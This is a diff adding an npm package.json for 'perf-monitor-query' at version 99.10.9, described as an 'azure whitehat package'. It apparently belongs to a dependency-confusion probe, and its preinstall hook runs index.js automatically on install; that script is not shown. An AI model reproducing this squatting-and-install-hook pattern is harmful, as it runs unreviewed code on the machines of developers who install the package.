@@ -1,0 +1,39 @@
+{
+    "name": "perf-monitor-query",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-monitor-query@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-QZ5KE27g4e63UdXyf8J5o5+JY7xhuE/I9vIdAldrAqn7us7NXMhxG3FlcBPktpIyjpeq9/EMtwYi1ClDFh5i4w==",
+        "shasum": "444431b4c7bd1564a00afb0d277036506020758b",
+        "tarball": "https://registry.npmjs.org/perf-monitor-query/-/perf-monitor-query-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3582,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon90CRA9TVsSAnZWagAAhN0QAIQ1RkR7JaB6hh4KKMCj\naM81Sxgny+mDVpy4Me1iz1QlT6wZrb7k3+KqZMrELEhXVGNe7ofNFNeusGDo\nCqnErC0hdUfzDnLrfoy0Ll2BQVNLDJfy1Ic1UpyYD8d8zUXWB7NxK8wVrF+H\nC0l4xxvlKLT8/MTZ+KQJNlDTxIM7rlR7mO4RPCjhPMGMAdY/gDkzMImdaVA9\nN0DsS9bh7ZceyRZLtKJ0X+bDjHXjg9Gqv1CXwyfR9S/2LrnKwJk2EI21Nvvs\n9Xe9E4oBfwvxAAS3TNy8cugFQXQGKI7BR80fTxnEppOQQMOceq+ZCWI52kGw\n9jUTCpetCt27DAOnU3HFBAMnei0iYtiGDWGODGkx0NKHUququeWepchNbbbi\nxcjcHdEMZtVHaODXFeBwMxTGJ6OCqgHiEMnyay68JqXxpTwwxoAx0AVM9S4J\nkp/qg4ppyIdbjqW84dv1ZbKfo5cR2XzpIpHp060xeWnAOqqp+Dd1NtcusAGm\nMzfyIm9V75J1dbMdFWxe3OT76XnE825wEENeaezYul0LAPrLTFfhs3ujbYUU\na5L8CHUoBy/4u+7eyxngeWXV2a38GJZ7/6S/DKdDjHgs8du3ndbJzL00Odji\nIbURgZrL3z0oe3eNA1eafHIhTwMZpTY87oc4GZrHulnUMwcuQoOjzsKDYHn7\neqxx\r\n=8CMJ\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-monitor-query_99.10.9_1638039412201_0.835559779663849"
+    },
+    "_hasShrinkwrap": false
+}
